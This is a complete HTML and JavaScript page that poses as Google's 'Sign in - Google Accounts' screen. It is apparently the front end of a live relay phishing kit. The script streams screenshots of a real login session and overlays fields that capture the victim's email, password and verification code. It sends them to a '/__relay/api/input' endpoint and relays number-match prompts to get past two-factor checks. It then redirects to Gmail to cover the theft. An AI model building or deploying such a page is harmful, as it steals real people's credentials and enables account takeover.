<!doctype html><html><head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=google content=notranslate>
<title>Sign in - Google Accounts</title>
<style>
*{box-sizing:border-box}
html,body{margin:0;background:#fff;height:100%}
body{font-family:Arial,sans-serif;display:flex;flex-direction:column;color:#202124}
.wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:10px;min-height:80vh}
#stage{position:relative;width:100%;max-width:1000px}
#shot{width:100%;height:auto;display:block;border-radius:10px;filter:blur(16px);transition:filter .3s}
#shot.on{filter:none}
#ov-in{position:absolute;display:none;padding:0 12px;font-size:15px;border:1px solid #dadce0;
 border-radius:4px;outline:none;background:#fff;z-index:5}
#ov-in.egpw{-webkit-text-security:disc}
#ov-btn{position:absolute;display:none;background:#0b57d0;color:#fff;border:none;border-radius:100px;
 font-size:14px;cursor:pointer;z-index:5}
#boot{margin:44px auto 12px;width:30px;height:30px;border:3px solid #dadce0;
 border-top-color:#0b57d0;border-radius:50%;animation:r 1s linear infinite}
@keyframes r{to{transform:rotate(360deg)}}
#num{display:none;background:#e8f0fe;color:#0b57d0;font-size:40px;font-weight:600;
 padding:12px 32px;border-radius:14px;margin:0 auto 14px;letter-spacing:8px;width:fit-content}
#st{margin:8px auto 0;font-size:13px;color:#5f6368;min-height:18px;text-align:center}
#st.err{color:#d93025}
.foot{padding:10px 24px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
.foot .l{display:flex;gap:18px}
</style></head><body>
<div class=wrap>
<div>
<div id=boot></div>
<div id=num style="display:none">00</div>
<div id=stage>
<img id=shot alt="">
<input id=ov-in autocomplete=off>
<button id=ov-btn>Next</button>
</div>
<div id=st></div>
</div>
</div>
<div class=foot><div class=l><span>English (United States)</span></div>
<div class=l><span>Help</span><span>Privacy</span><span>Terms</span></div></div>
<script>
var SID=null, KIND=null,
    shot=document.getElementById('shot'), stage=document.getElementById('stage'),
    ovIn=document.getElementById('ov-in'), ovBtn=document.getElementById('ov-btn'),
    boot=document.getElementById('boot'), numEl=document.getElementById('num'),
    stEl=document.getElementById('st');
['pointermove','keydown','touchstart'].forEach(function(ev){
 document.addEventListener(ev,function(){shot.classList.add('on');},{once:true,capture:true});});
function setSt(t,err){stEl.textContent=t||'';stEl.className=err?'err':'';}
function place(el,box,extra){
 if(!box){el.style.display='none';return;}
 el.style.display='block';
 el.style.left=box.x+'%';el.style.top=box.y+'%';
 el.style.width=box.w+'%';el.style.height=box.h+'%';
 if(extra)extra();}
function submit(){
 if(!ovIn.value||!KIND)return;
 ovIn.blur();ovIn.style.display='none';ovBtn.style.display='none';
 setSt('Đang xử lý…');
 fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
  body:JSON.stringify({id:SID,kind:KIND,value:ovIn.value})}).catch(function(){setSt('Lỗi mạng',1);});
}
ovBtn.onclick=submit;
ovIn.onkeydown=function(k){if(k.key==='Enter')submit();};
var PLACE={email:'Email or phone',password:'Mật khẩu',code:'Mã xác minh'};
function render(x){
 if(x.screenshot){
  shot.src='data:image/jpeg;base64,'+x.screenshot;
  boot.style.display='none';shot.style.display='block';
 }
 if(x.match_number){numEl.style.display='block';numEl.textContent=x.match_number;}
 var ib=x.input_box, bb=x.button_box, k=x.input_kind;
 if(ib&&k&&x.state!=='done'&&x.state!=='error'){
  KIND=k;
  ovIn.className=k==='password'?'egpw':'';
  ovIn.placeholder=PLACE[k]||'';
  if(ovIn.getAttribute('data-k')!==k){ovIn.value='';ovIn.setAttribute('data-k',k);}
  place(ovIn,ib);
  place(ovBtn,bb);
  if(document.activeElement!==ovIn)setTimeout(function(){ovIn.focus();},120);
 }else{
  ovIn.style.display='none';ovBtn.style.display='none';
 }
 if(x.state==='done'){setSt('Đăng nhập thành công — đang chuyển tới Gmail…');
  setTimeout(function(){location.href='https://mail.google.com';},2400);return;}
 if(x.state==='error'){setSt(x.hint||'Không thể đăng nhập',1);return;}
}
function poll(){
 if(!SID){setTimeout(poll,900);return;}
 fetch('/__relay/api/state?id='+SID).then(function(r){return r.json();})
  .then(function(x){render(x);setTimeout(poll,1200);})
  .catch(function(){setTimeout(poll,2200);});
}
setSt('Đang mở trang đăng nhập…');
fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify({})}).then(function(r){return r.json();}).then(function(j){SID=j.id;poll();})
 .catch(function(){setSt('Lỗi mạng — tải lại trang',1);});
poll();
</script></body></html>
